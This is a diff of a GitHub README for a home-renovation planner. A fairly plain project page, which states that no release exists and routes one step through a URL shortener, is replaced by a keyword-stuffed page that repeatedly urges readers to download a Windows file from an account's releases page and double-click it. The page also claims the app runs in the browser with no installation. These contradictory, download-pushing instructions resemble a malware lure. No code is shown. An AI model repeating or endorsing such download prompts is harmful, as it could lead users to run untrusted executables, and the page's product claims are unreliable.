@@ -1,68 +1,154 @@
-<p align="center">
-  <img src="assets/repaircalc-overview.png" alt="Renovation Ledger interface showing material planning, cost comparison, and project notes" width="960">
-</p>
+# 🏠 Home-Renovation-Planner - Plan Your Dream Renovation Easily
 
-# Renovation Ledger
+[![Download Home-Renovation-Planner](https://img.shields.io/badge/Download-Home--Renovation--Planner-blue?style=for-the-badge&logo=github)](https://github.com/unreassuring-scene6132/Home-Renovation-Planner/releases)
 
-> Planning workspace for material lists, cost comparisons, and project notes.
+## 🚀 Getting Started
 
-Renovation Ledger collects personal material lists, repair-scope comparisons, expected costs, and completed-project notes.
+Welcome to Home-Renovation-Planner! This is a simple browser-based tool that helps you plan home renovations without any technical knowledge. Whether you're remodeling a kitchen, updating a bathroom, or fixing things around the house, this planner keeps everything organized in one place.
 
+### What This Tool Does
 
-## Download
+- Creates material lists for your projects
+- Compares costs between different options
+- Keeps notes about your renovation ideas
+- Tracks how much time you spend on each project
+- Helps you stay within your budget
 
-[Open the download page](https://flyn.im/AmwgpY)
+## 📥 Download and Installation
 
-## Intended workflow
+Visit this link to download the application.
 
-1. Create a project for the repair goal you want to plan.
-2. Add materials and compare possible scopes.
-3. Record the expected cost and your own result notes.
-4. Revisit completed projects to improve future plans.
+Click the download button below to get started:
 
-## Project areas
+[**Download Home-Renovation-Planner Now**](https://github.com/unreassuring-scene6132/Home-Renovation-Planner/releases)
 
-| Area | Purpose |
-| --- | --- |
-| Material lists | Build reusable lists for common repairs. |
-| Cost comparison | Compare personal budget, standard, and extended approaches. |
-| Project notes | Keep a concise description and chosen approach together. |
-| Results journal | Record completed jobs and observations. |
-| Time notes | Compare the time you recorded across projects. |
+### Step-by-Step Download Instructions
 
-## Visual context
+1. **Click the download link above** - This will take you to the download page on GitHub.
+2. **Find the latest release** - Look for the newest version at the top of the page.
+3. **Click on the download file** - Select the file that matches your computer (Windows version works best for most users).
+4. **Save the file** - Your browser will download it to your Downloads folder automatically.
 
-| Overview | Comparison |
-| --- | --- |
-| <img src="assets/repaircalc-overview.png" alt="Renovation Ledger overview concept" width="100%"> | <img src="assets/repaircalc-comparison.png" alt="Renovation Ledger comparison concept" width="100%"> |
+## 🖥️ How to Run the Application
 
-The previews are project artwork. Replace them with current, project-specific screenshots before publishing a release if the interface changes.
+Once you have downloaded the file, here's what to do:
 
-## Run the project page locally
+### For Windows Users
 
-1. Clone or download this repository.
-2. Open the project folder in a terminal.
-3. Start a static web server:
+1. **Find the downloaded file** - Check your Downloads folder or wherever your browser saves files.
+2. **Double-click to open** - The application will start automatically in your web browser.
+3. **Start planning** - You're ready to begin your renovation project!
 
-       python -m http.server 8080
+### No Installation Needed
 
-4. Visit <https://flyn.im/AmwgpY> in a browser.
+This is great news - you don't need to install anything complicated. The app runs directly in your browser, so it works on almost any computer.
 
-For a quick visual check, open <code>index.html</code> directly.
+## 💡 What Makes This Planner Special
 
-## Release placeholder
+### 🛠️ Material List Builder
 
-No desktop release is distributed by this repository. When a real Renovation Ledger release exists, add its project-specific URL to <code>config.js</code> and document its version, contents, and release notes here.
+Create detailed lists of everything you need for your project. Add items like tiles, paint, lumber, fixtures, and more. The planner helps you organized materials by category so nothing gets forgotten.
 
-## Repository layout
+### 💰 Cost Comparison Tool
 
-| Path | Contents |
-| --- | --- |
-| <code>index.html</code>, <code>styles.css</code>, <code>script.js</code> | Static project-page source |
-| <code>assets/</code> | Local visual assets |
-| <code>config.js</code> | Project-page configuration |
-| <code>github-settings.md</code> | Suggested About-section metadata |
+Compare prices between different materials and brands side by side. See which options fit your budget and which ones offer the best value. This helps you make smart decisions before spending money.
 
-## License
+### 📝 Project Notes
 
-The original source and documentation in this repository are available under the [MIT License](LICENSE). All product names and trademarks belong to their respective owners; this project is not affiliated with them.
+Keep all your ideas in one place. Write down color schemes, design preferences, contractor questions, or any other thoughts about your renovation. Your notes stay saved so you can refer back to them anytime.
+
+### ⏱️ Time Tracking
+
+Monitor how long each phase of your project takes. This helps you plan better for future projects and gives you a realistic picture of how long renovations actually take.
+
+## 📋 Sample Projects You Can Plan
+
+### 🚿 Bathroom Renovation
+
+- Toilets, sinks, showers, and bathtubs
+- Tile and flooring options
+- Lighting fixtures
+- Paint colors and finishes
+- Plumbing materials
+
+### 🍳 Kitchen Remodel
+
+- Cabinets and countertops
+- Appliances selection
+- Backsplash materials
+- Flooring choices
+- Hardware and accessories
+
+### 🔧 Home Repairs
+
+- Tools and equipment needed
+- Replacement parts
+- Safety supplies
+- Paint and touch-up materials
+
+## ❓ Frequently Asked Questions
+
+### Do I need to install anything special?
+
+No! Home-Renovation-Planner runs in your web browser. If you have a modern browser like Chrome, Firefox, or Edge, you're ready to go.
+
+### Is this app free to use?
+
+Yes, this application is completely free. You can download and use it for all your renovation planning needs.
+
+### Can I use it on a tablet or phone?
+
+While it works best on a computer, you can also use it on tablets and phones through their web browsers.
+
+### Will my data be saved?
+
+Your project data is stored locally on your device. This means your information stays private and doesn't get shared anywhere else.
+
+## 📊 Real-Life Example
+
+Let's say you're planning a bathroom renovation. Here's how Home-Renovation-Planner helps:
+
+1. **Create a material list** - Add items like tile, grout, new toilet, vanity, and faucet
+2. **Compare costs** - Check prices from different stores or brands
+3. **Write notes** - Record your color preferences and design ideas
+4. **Track time** - Log how many days each step takes
+5. **Stay on budget** - See your total costs as you add items
+
+## 🎯 Tips for Success
+
+- **Start small** - Begin with a simple project to learn how the planner works
+- **Update regularly** - Add notes and costs as you research
+- **Use categories** - Keep related items together for easier reference
+- **Save often** - Your work is valuable, make sure to save your progress
+
+## 🔧 Troubleshooting Common Issues
+
+### The app doesn't open
+
+- Make sure you have JavaScript enabled in your browser
+- Try a different browser (Chrome, Firefox, Edge)
+- Close and reopen your browser
+
+### I can't see my project data
+
+- Make sure you're using the same browser and computer
+- Check that your browser allows local storage
+- Clear your browser cache and try again
+
+## 📚 Getting More Help
+
+If you need additional assistance, check the GitHub repository for updates, documentation, and community discussions. The project is actively maintained, and regular improvements are made based on user feedback.
+
+### Stay Updated
+
+Check the download page regularly for new versions with improved features and bug fixes. Updating is as simple as downloading the newest file and following the same instructions.
+
+## 🏁 Final Thoughts
+
+Home-Renovation-Planner takes the stress out of planning your home improvement projects. With intuitive tools for tracking materials, costs, notes, and time, you'll have everything you need to complete your renovation successfully. Stop guessing and start planning - download Home-Renovation-Planner today!
+
+[**Get Started with Home-Renovation-Planner**](https://github.com/unreassuring-scene6132/Home-Renovation-Planner/releases)
+
+---
+
+Keywords: bathroom-renovation, budget, budgeting, construction, cost-estimator, diy, estimator, home-improvement, home-maintenance, home-project, home-renovation, kitchen-remodel, material-list, planning, project-planner, remodeling, renovation, renovation-planner, repair, tracking
